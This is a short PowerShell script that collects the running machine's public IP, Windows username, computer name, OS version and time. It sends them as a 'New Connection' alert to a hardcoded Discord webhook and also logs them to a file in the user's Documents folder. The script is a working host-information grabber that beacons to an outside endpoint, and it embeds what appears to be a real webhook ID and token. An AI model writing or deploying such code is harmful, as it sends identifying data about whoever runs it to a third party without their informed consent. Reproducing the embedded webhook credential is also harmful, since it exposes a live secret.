# Get public IP
try {
    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org")
} catch {
    $ip = "Unable to fetch IP"
}

# Get username
$user = $env:USERNAME
# Get machine / Windows info
$os = (Get-CimInstance Win32_OperatingSystem).Caption
# Get computer name
$computer = $env:COMPUTERNAME
# Get time
$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

# Compose message
$message = "**New Connection**`n:clock1: $time`n:computer: $computer`n:bust_in_silhouette: $user`n:desktop: $os`n:globe_with_meridians: $ip"

# Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"

Write-Host "Collecting information..." -ForegroundColor Yellow
Write-Host "User: $user"
Write-Host "Computer: $computer"
Write-Host "OS: $os"
Write-Host "IP: $ip"
Write-Host "`nSending to Discord..." -ForegroundColor Yellow

# Create JSON payload
$payload = @{
    content = $message
} | ConvertTo-Json

# Send to Discord
try {
    $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
    Write-Host "SUCCESS! Data sent to Discord!" -ForegroundColor Green
} catch {
    Write-Host "FAILED to send data!" -ForegroundColor Red
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Status Code: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
    
    # Check if webhook URL is still default
    if ($webhookUrl -like "*YOUR_WEBHOOK*") {
        Write-Host "`nERROR: You need to replace YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN with your actual Discord webhook URL!" -ForegroundColor Red
    }
}

# Also save locally as backup
$doc = [Environment]::GetFolderPath("MyDocuments")
$out = Join-Path $doc "ip.txt"
Add-Content -Path $out -Value "$time | $user | $computer | $os | IP: $ip"
Write-Host "`nBackup saved to: $out" -ForegroundColor Cyan

Read-Host "`nPress Enter to close"
